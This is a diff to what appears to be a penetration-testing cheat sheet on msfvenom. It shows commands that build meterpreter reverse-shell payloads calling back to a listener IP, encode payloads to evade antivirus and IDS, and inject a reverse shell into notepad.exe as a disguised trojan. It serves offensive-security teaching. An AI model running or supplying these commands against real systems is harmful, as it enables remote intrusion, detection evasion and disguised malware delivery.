@@ -69,3 +69,33 @@ msfvenom -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=44
 # PHP reverse shell
 msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php
 ```
+
+
+## Encoding payloads
+Payload encoding is used to bypass security mechanisms like antivirus software and intrusion detection systems (IDS). Encoding obfuscates the payload by transforming it into a different format, making it harder for security tools to detect.
+
+To encode a payload, use the `-e` flag to specify the encoder and `-i` to set the number of iterations.
+
+```bash
+msfvenom -p <payload> LHOST=<ip> LPORT=<port> -e <encoder> -i <iterations> -f <format>
+```
+
+#### Common Encoders
+
+|**Encoder**|**Description**|
+|---|---|
+|`x86/shikata_ga_nai`|A polymorphic XOR additive feedback encoder for x86 architecture.|
+|`cmd/powershell_base64`|Encodes payloads into Base64 for PowerShell execution.|
+|`x64/xor_dynamic`|XOR encoder for x64 payloads.|
+|`php/base64`|Encodes PHP payloads in Base64.|
+|`ruby/base64`|Encodes Ruby payloads in Base64.|
+|`generic/none`|No encoding applied (default).|
+## Injecting Payloads Into Windows Portable Executables
+Injecting payloads into legitimate Windows Portable Executables (PEs) is a common technique used to deliver malicious code while masquerading as a benign application. 
+
+- `-x`: Path to the legitimate executable to inject the payload into.
+- `-k`: Retains the original functionality of the legitimate executable.
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x notepad.exe -k -f exe -o notepad_infected.exe
+```
